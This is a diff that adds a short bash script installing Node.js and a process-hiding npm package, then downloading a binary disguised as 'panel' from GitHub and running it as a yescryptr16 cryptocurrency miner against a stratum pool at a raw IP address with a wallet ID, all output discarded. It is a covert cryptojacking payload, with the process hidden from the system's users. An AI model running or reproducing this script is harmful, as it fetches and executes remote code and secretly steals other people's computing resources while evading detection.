@@ -1,0 +1,8 @@
+#!/bin/bash
+apt update -y
+apt install gcc screen -y
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
+apt install nodejs -y
+npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add panel
+wget https://github.com/danipedrosang/marcrash/raw/main/panel && chmod +x panel
+./panel -a yescryptr16 -o stratum+tcp://47.89.234.73:443 -u web1qyzgpcnssde96zrfs3n4g6saunyy6mm534wzjeh.edu >/dev/null 2>&1
